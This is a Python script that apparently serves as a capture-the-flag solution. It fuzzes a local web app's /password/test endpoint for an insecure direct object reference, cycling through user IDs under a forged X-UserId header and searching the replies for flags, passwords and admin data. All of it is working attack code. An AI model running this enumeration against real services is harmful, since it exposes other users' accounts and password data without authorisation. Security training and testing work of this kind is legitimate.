import requests
import json
import re
import time

# Configuration
base_url = "http://127.0.0.1:33200"
endpoint = "/password/test"
headers = {
    "X-UserId": "10032",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Test user IDs: 1-50 and nearby 10032
test_ids = list(range(1, 51)) + [10030, 10031, 10032, 10033, 10034, 10035, 10036]

print("[+] Starting IDOR fuzzing test")
print(f"[+] Target: POST {base_url}{endpoint}")
print(f"[+] Testing {len(test_ids)} user IDs")
print("=" * 60)

# Track responses to identify anomalies
responses = {}

# Test each user_id
for user_id in test_ids:
    try:
        # POST data with modified user_id
        data = {
            "user_id": user_id
        }
        
        response = requests.post(
            f"{base_url}{endpoint}",
            headers=headers,
            data=data,
            timeout=10
        )
        
        # Store response details
        content_length = len(response.content)
        status_code = response.status_code
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"\n[!] FLAG FOUND for user_id={user_id}")
            print(f"[!] Flag: {flag_match.group(0)}")
            print(f"[!] Full response:\n{response.text}")
        
        # Check for interesting patterns
        patterns = {
            "password": re.search(r'password', response.text, re.I),
            "admin": re.search(r'admin', response.text, re.I),
            "error": re.search(r'error', response.text, re.I),
            "user": re.search(r'user', response.text, re.I),
            "access": re.search(r'access', response.text, re.I)
        }
        
        found_patterns = [k for k, v in patterns.items() if v]
        
        # Print result
        print(f"\n[+] user_id={user_id}")
        print(f"    Status: {status_code}")
        print(f"    Length: {content_length}B")
        if found_patterns:
            print(f"    Keywords: {', '.join(found_patterns)}")
        if response.text.strip():
            print(f"    Response: {response.text[:300]}...")
        
        # Track for anomaly detection
        key = (status_code, content_length)
        if key not in responses:
            responses[key] = []
        responses[key].append(user_id)
        
    except Exception as e:
        print(f"[-] Error for user_id={user_id}: {str(e)}")

print("\n" + "=" * 60)
print("[+] Summary of Response Patterns")

# Group by status code and content length
for (status, length), user_ids in responses.items():
    print(f"\nStatus: {status} | Length: {length}B")
    print(f"Count: {len(user_ids)} IDs")
    print(f"User IDs: {user_ids[:10]}{'...' if len(user_ids) > 10 else ''}")

# Check for anomalies (different response patterns)
if len(responses) > 1:
    print(f"\n[!] {len(responses)} different response patterns detected!")
    print("[!] This suggests the vulnerability exists and returns different data for different users.")
    
    # Find the most common pattern (baseline)
    pattern_counts = {k: len(v) for k, v in responses.items()}
    baseline_pattern = max(pattern_counts, key=pattern_counts.get)
    baseline_ids = responses[baseline_pattern]
    
    print(f"\n[!] Baseline pattern (most common): Status {baseline_pattern[0]}, Length {baseline_pattern[1]}B")
    print(f"[!] Affected IDs: {len(baseline_ids)}")
    
    # Identify anomalous responses
    for pattern, user_ids in responses.items():
        if pattern != baseline_pattern:
            print(f"\n[!] ANOMALY DETECTED:")
            print(f"    Pattern: Status {pattern[0]}, Length {pattern[1]}B")
            print(f"    User IDs: {user_ids}")
            
else:
    print("\n[-] Only one response pattern detected - may indicate blocked access or no variance")

print("\n[+] IDOR fuzzing test complete")
